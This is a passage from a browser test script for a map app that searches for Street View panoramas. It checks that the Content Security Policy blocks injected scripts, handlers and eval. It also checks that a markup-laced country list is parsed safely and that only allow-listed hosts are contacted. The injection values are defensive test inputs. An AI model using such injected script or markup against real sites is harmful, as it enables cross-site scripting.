        document.head.append(e);
      });
      try {
        out.evalRan = eval("1+1");
      } catch {
        out.evalRan = "blocked";
      }
      return out;
    });
    console.log(JSON.stringify(csp), blocked.length, "CSP reports");
    ok(
      csp.inline === undefined &&
        csp.handler === undefined &&
        csp.ext === "blocked" &&
        csp.evalRan === "blocked",
      "CSP blocks injected scripts, handlers, eval and foreign scripts",
    );
    ok(
      (await page.evaluate(() => Object.keys(localStorage).filter(k => /key/.test(k)).length)) === 0 &&
        (await page.evaluate(() => sessionStorage.getItem("lookout2.key"))) === "KEY",
      "visitor key only in session storage",
    );
    ok(
      log.errors.filter(e => !/Content Security Policy|Refused/.test(e)).length === 0,
      "no page errors " + log.errors.filter(e => !/Content Security Policy|Refused/.test(e)).join(" | "),
    );
  }
  // ---- no third-party assets; settings block; Google script fallback still allowed by the policy
  {
    const html = fs.readFileSync(path.resolve(__dirname, "../dist/index.nokey.html"), "utf8");
    const edited = html
      .replace('"googleApiKey": ""', '"googleApiKey": "AIzaSyTESTKEY_0123456789abcdefghijklmn"')
      .replace('"streetViewCountries": "AD AE AL', '"streetViewCountries": "MG BY <b>x</b> zz QQ AD AE AL');
    fs.writeFileSync(path.resolve(__dirname, "../dist/edited.html"), edited);
    const ctx = await browser.newContext({ viewport: { width: 1360, height: 860 } });
    const page = await ctx.newPage();
    const seen = [],
      errs = [];
    page.on("pageerror", e => errs.push(String(e)));
    const H = { "access-control-allow-origin": "*" };
    await page.route("**/*", async route => {
      const u = route.request().url();
      if (isSite(u)) return serveSite(route);
      seen.push(u);
      if (u.includes("/api/interpreter"))
        return route.fulfill({ json: { elements: [A("MT"), ...PL.slice(0, 3)] }, headers: H });
      if (u.includes("streetview/metadata")) return route.abort();
      if (u.includes("maps/api/js"))
        return route.fulfill({
          contentType: "text/javascript",
          body: `
        window.google={maps:{importLibrary:async()=>({StreetViewService:class{getPanorama(req,cb){
          if(req.location.lat.toFixed(4)!=='35.9000') return cb(null,'ZERO_RESULTS');
          cb({location:{pano:'FALLBACKPANO_0001',latLng:{lat:()=>35.8999,lng:()=>14.5}},copyright:'© 2024 Google',imageDate:'2021-06'},'OK');}}})}};
        window.__lookoutReady();`,
        });
      if (u.includes("taginfo"))
        return route.fulfill({ json: { data: [{ type: "all", count: 100 }] }, headers: H });
      return route.fulfill({ status: 204, body: "" });
    });
    await page.goto(SITE + "edited.html");
    await page.waitForLoadState("load");
    ok(
      (await page.isHidden("#keyBox")) && (await page.evaluate(() => COVERAGE.size)) === 122,
      "settings block: key hides the field, country list edited safely: " +
        (await page.evaluate(() => COVERAGE.size)),
    );
    ok(!!(await page.evaluate(() => window.L && map)), "embedded map library runs under the policy");
    ok(
      (await page.evaluate(() => getComputedStyle(document.body).fontFamily)).includes("Overpass") &&
        (await page.evaluate(() => document.fonts.check("16px Overpass"))),
      "embedded font available",
    );
    await chooseKind(page, "Lighthouse");
    await allCoverage(page);
    await page.click("#go");
    await done(page);
    ok(
      (await page.evaluate(() => results.map(r => r.panoId).join())) === "FALLBACKPANO_0001",
      "Google script fallback works under the policy",
    );
    ok(
      seen
        .filter(u => u.includes("googleapis"))
        .every(u => u.includes("key=AIzaSyTESTKEY_0123456789abcdefghijklmn")),
      "site key used for Google calls",
    );
    const hosts = [...new Set(seen.map(u => new URL(u).host))].sort();
    console.log("hosts contacted:", hosts.join(", "));
    ok(
      hosts.every(h =>
        [
          "maps.googleapis.com",
          "overpass-api.de",
          "overpass.private.coffee",
          "overpass.kumi.systems",
          "taginfo.openstreetmap.org",
          "tile.openstreetmap.org",
        ].includes(h),
      ),
      "only the expected hosts are contacted",
    );
    ok(errs.length === 0, "no page errors " + errs.join(" | "));
    await ctx.close();
  }
  {
    const { page } = await setup(browser, { vp: { width: 390, height: 800 } });
    await page.screenshot({
      path: require("path").join(__dirname, "../dist/screens/m2.png"),
      fullPage: true,
    });
    ok(await page.evaluate(() => document.documentElement.scrollWidth <= 390), "no horizontal scroll");
  }
  await browser.close();
  console.log(fail ? fail + " FAILED" : "ALL PASS");
  process.exit(fail ? 1 : 0);
})();
